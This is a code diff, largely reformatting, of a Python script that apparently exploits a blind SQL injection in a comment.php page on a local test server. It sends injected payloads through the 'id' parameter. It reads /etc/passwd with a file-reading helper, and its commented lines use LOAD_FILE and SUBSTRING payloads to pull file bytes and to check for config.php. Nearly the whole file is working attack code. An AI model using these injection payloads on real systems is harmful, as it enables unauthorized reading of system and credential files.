@@ -11,18 +11,21 @@ from string_finder import StringFinder
 
 
 def test(payload):
-	r = requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)
-	print('[*] {} => {}'.format(payload, 'admin' not in r.text))	
-	#print(r.request.url)
-	return 'admin' not in r.text
+    r = requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload)}, verify=False)
+    print('[*] {} => {}'.format(payload, 'admin' not in r.text))
+    # print(r.request.url)
+    return 'admin' not in r.text
+
 
 class MyTester(Tester):
 
     def __init__(self):
-        super(MyTester, self).__init__(lambda r : 'admin' in r.text, True)
-    
+        super(MyTester, self).__init__(lambda r: 'admin' in r.text, True)
+
     def get_request(self, payload):
-        return requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload), 'log' : '1'}, verify=False)
+        return requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'},
+                            verify=False)
+
 
 tester = MyTester()
 
@@ -38,18 +41,14 @@ print(sf.read_file('/etc/passwd'))
 
 # print(read_string("(SELECT version())"))
 
-#print(test( "AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(
-#		encode_str('/etc/passwd'), 1, 72)))
+# print(test( "AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(encode_str('/etc/passwd'), 1, 72)))
 
 # print(test("UNION ALL SELECT 1 as cmd"))
 
-#read_file('/etc/passwd')
+# read_file('/etc/passwd')
 
-#print(test(file_exists('/etc/passwd')))
+# print(test(file_exists('/etc/passwd')))
 
-#print(test(fl_equal('/etc/passwd', 1386)))
+# print(test(fl_equal('/etc/passwd', 1386)))
 
-#print(test(file_exists('/usr/share/nginx/www/config.php')))
-
-
-
+# print(test(file_exists('/usr/share/nginx/www/config.php')))
